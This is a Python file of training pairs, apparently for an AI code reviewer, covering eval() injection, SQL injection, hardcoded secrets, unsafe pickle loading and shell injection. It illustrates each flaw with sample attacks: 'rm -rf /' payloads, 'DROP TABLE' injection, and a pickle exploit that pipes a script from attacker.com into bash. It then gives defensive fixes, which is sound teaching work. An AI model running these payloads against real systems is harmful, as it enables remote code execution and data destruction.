"""
Anti-pattern training pairs - Security anti-patterns
Topics: eval(), SQL injection, hardcoded secrets, pickle untrusted data, shell injection
"""

pairs = [
    {
        "instruction": r'''I wrote a config parser that lets users define custom calculations. Is this okay?

```python
def apply_formula(user_input, data):
    result = eval(user_input, {"data": data})
    return result

# Usage: apply_formula("data['price'] * 1.1", product_data)
```''',
        "output": r'''<think>
This is a classic eval() anti-pattern. The user passes raw user input to eval(), which allows arbitrary code execution. Even with a restricted globals dict, eval can escape sandboxing using builtins. The user seems unaware of the danger -- they think restricting the namespace is enough.
</think>

This is a critical security vulnerability. `eval()` executes arbitrary Python code, meaning any user can run anything on your server -- not just math on `data`.

**Why restricting globals doesn't help:**

An attacker can still access builtins and escape:

```python
# Attacker input:
"__import__('os').system('rm -rf /')"
```

Even if you pass `{"__builtins__": {}}`, there are known escapes through object introspection (`().__class__.__bases__[0].__subclasses__()`).

**The fix -- use a safe expression evaluator:**

```python
import ast
import operator

SAFE_OPS = {
    ast.Add: operator.add,
    ast.Sub: operator.sub,
    ast.Mult: operator.mul,
    ast.Div: operator.truediv,
}

def safe_eval(expr, variables):
    tree = ast.parse(expr, mode='eval')
    return _eval_node(tree.body, variables)

def _eval_node(node, variables):
    if isinstance(node, ast.Num):
        return node.n
    if isinstance(node, ast.Name):
        if node.id in variables:
            return variables[node.id]
        raise ValueError(f"Unknown variable: {node.id}")
    if isinstance(node, ast.BinOp):
        op_func = SAFE_OPS.get(type(node.op))
        if not op_func:
            raise ValueError(f"Unsupported operation")
        return op_func(
            _eval_node(node.left, variables),
            _eval_node(node.right, variables)
        )
    raise ValueError(f"Unsupported expression")
```

**Rule of thumb:** Never pass user input to `eval()`, `exec()`, or `compile()`. If you need user-defined expressions, use AST parsing with a whitelist of allowed operations, or a purpose-built library like `simpleeval`.'''
    },
    {
        "instruction": r'''Here's my login function. It works fine in testing:

```python
def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    return user is not None
```''',
        "output": r'''<think>
Classic SQL injection via string formatting. The user is building SQL with f-strings, allowing an attacker to break out of the string literal and inject arbitrary SQL. Also storing plaintext passwords, but the SQL injection is the primary anti-pattern here. The user says "works fine in testing" -- they tested with normal inputs only.
</think>

This has a textbook SQL injection vulnerability. An attacker can log in as anyone without knowing their password.

**The attack:**

```
username: admin' --
password: anything
```

This produces:
```sql
SELECT * FROM users WHERE username='admin' --' AND password='anything'
```

The `--` comments out the password check. The attacker is now logged in as admin.

Worse, an attacker could destroy your database:
```
username: '; DROP TABLE users; --
```

**The fix -- always use parameterized queries:**

```python
def login(username, password_attempt):
    query = "SELECT password_hash FROM users WHERE username = %s"
    cursor.execute(query, (username,))
    row = cursor.fetchone()
    if row is None:
        return False
    return bcrypt.checkpw(
        password_attempt.encode(), row[0].encode()
    )
```

**Two problems fixed:**
1. **Parameterized query** -- the database driver escapes the input, making injection impossible. The `%s` placeholder is NOT string formatting -- it is handled by the driver.
2. **Password hashing** -- your original stored plaintext passwords. Always hash with bcrypt or argon2.

Never build SQL with f-strings, `.format()`, or `%` string interpolation. Always use parameterized queries with placeholders.'''
    },
    {
        "instruction": r'''My app needs to call the Stripe API. I put the key right in the config module so it's easy to find:

```python
# config.py
STRIPE_API_KEY = "sk_live_abc123examplekey999"
DATABASE_URL = "postgresql://admin:s3cretpass@db.prod.example.com/myapp"
DEBUG = False
```''',
        "output": r'''<think>
Hardcoded secrets in source code. This file will end up in version control, meaning anyone with repo access sees production credentials. Even if removed later, git history preserves them forever. The user thinks putting them in a config module is organized -- they don't realize the security implications.
</think>

Hardcoding secrets in source files is one of the most common security mistakes. Once this file is committed to git, those credentials are in the history forever -- even if you delete them later.

**Why this is dangerous:**
- Anyone with repo access (current and future employees, contractors) sees your production keys
- If the repo is ever accidentally made public, your keys are leaked instantly
- Bots actively scan GitHub for patterns like `sk_live_` and exploit them within minutes
- Git history preserves the secret even after you "fix" it

**The fix -- use environment variables:**

```python
# config.py
import os

STRIPE_API_KEY = os.environ["STRIPE_API_KEY"]
DATABASE_URL = os.environ["DATABASE_URL"]
DEBUG = os.environ.get("DEBUG", "false").lower() == "true"
```

Then set them in your environment (not in code):

```bash
# .env file (added to .gitignore, NEVER committed)
STRIPE_API_KEY=sk_live_abc123examplekey999
DATABASE_URL=postgresql://admin:s3cretpass@db.prod.example.com/myapp
```

Load with `python-dotenv` in development:

```python
from dotenv import load_dotenv
load_dotenv()
```

**For production**, use your platform's secret management (AWS Secrets Manager, Vault, Kubernetes secrets, or your PaaS's config vars).

**Immediate action:** If these credentials were ever committed to git, rotate them NOW. Removing the commit is not enough -- anyone who cloned the repo already has them.'''
    },
    {
        "instruction": r'''I'm building a caching layer that serializes Python objects to disk. This seems to work well:

```python
import pickle

def load_user_session(session_file):
    with open(session_file, 'rb') as f:
        return pickle.load(f)

def save_user_session(session_data, session_file):
    with open(session_file, 'wb') as f:
        pickle.dump(session_data, f)
```

Users upload their session files to resume work. Is there a performance concern?''',
        "output": r'''<think>
The user is asking about performance but the real problem is security. They are loading pickle files uploaded by users -- pickle.load can execute arbitrary code during deserialization. This is a remote code execution vulnerability, not a performance issue. I need to redirect their attention to the critical security flaw.
</think>

Performance is not your concern here -- **this is a remote code execution vulnerability**. The `pickle.load()` call will execute arbitrary Python code embedded in the file.

**The attack:**

A malicious user uploads a crafted pickle file:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

with open('evil_session.pkl', 'wb') as f:
    pickle.dump(Exploit(), f)
```

When your server calls `pickle.load()` on this file, it runs the attacker's command with your server's privileges.

**The fix -- use a safe serialization format:**

```python
import json

def load_user_session(session_file):
    with open(session_file, 'r') as f:
        data = json.load(f)
    # Validate the structure
    required_keys = {"user_id", "preferences", "workspace"}
    if not required_keys.issubset(data.keys()):
        raise ValueError("Invalid session format")
    return data

def save_user_session(session_data, session_file):
    with open(session_file, 'w') as f:
        json.dump(session_data, f)
```

**Rules for serialization of untrusted data:**
- Use JSON, MessagePack, or Protocol Buffers -- formats that cannot encode executable logic
- If you must use pickle (e.g., ML models), only load files YOU created, never user-uploaded files
- Validate and sanitize the deserialized data against a schema regardless of format'''
    },
    {
        "instruction": r'''I need to let users convert files using ffmpeg on our server. Here's my approach:

```python
from flask import request
import os

@app.route('/convert', methods=['POST'])
def convert_video():
    filename = request.form['filename']
    output_format = request.form['format']
    os.system(f"ffmpeg -i uploads/{filename} output/{filename}.{output_format}")
    return "Conversion started"
```''',
        "output": r'''<think>
Shell injection via os.system with user-controlled input. Both filename and output_format are directly from the request and interpolated into a shell command. An attacker can inject arbitrary commands using shell metacharacters like semicolons or backticks. os.system runs through the shell, so all shell features are available to the attacker.
</think>

This is a shell injection vulnerability. The user controls both `filename` and `format`, which are interpolated directly into a shell command.

**The attack:**

```
filename: video.mp4; rm -rf / ;
format: mp4
```

This executes:
```bash
ffmpeg -i uploads/video.mp4; rm -rf / ; output/video.mp4;.mp4
```

The semicolons break the command into three separate commands, and `rm -rf /` runs with your server's privileges.

**The fix -- use subprocess with a list (no shell):**

```python
import subprocess
import re
from flask import request, abort

ALLOWED_FORMATS = {"mp4", "webm", "avi", "mkv"}
FILENAME_PATTERN = re.compile(r'^[a-zA-Z0-9_.-]+$')

@app.route('/convert', methods=['POST'])
def convert_video():
    filename = request.form['filename']
    output_format = request.form['format']

    # Validate inputs against allowlists
    if not FILENAME_PATTERN.match(filename):
        abort(400, "Invalid filename")
    if output_format not in ALLOWED_FORMATS:
        abort(400, "Unsupported format")

    input_path = f"uploads/{filename}"
    output_path = f"output/{filename}.{output_format}"

    # Use list form -- no shell involved
    subprocess.run(
        ["ffmpeg", "-i", input_path, output_path],
        capture_output=True,
        timeout=300
    )
    return "Conversion started"
```

**Key changes:**
1. **`subprocess.run` with a list** -- arguments are passed directly to the process, not through a shell. Shell metacharacters like `;` and `|` are treated as literal characters.
2. **Input validation** -- allowlist of formats and a strict filename regex prevent path traversal (`../../etc/passwd`) and unexpected characters.
3. **Never use `os.system()`** -- it always invokes a shell. Use `subprocess.run()` with `shell=False` (the default).'''
    },
]
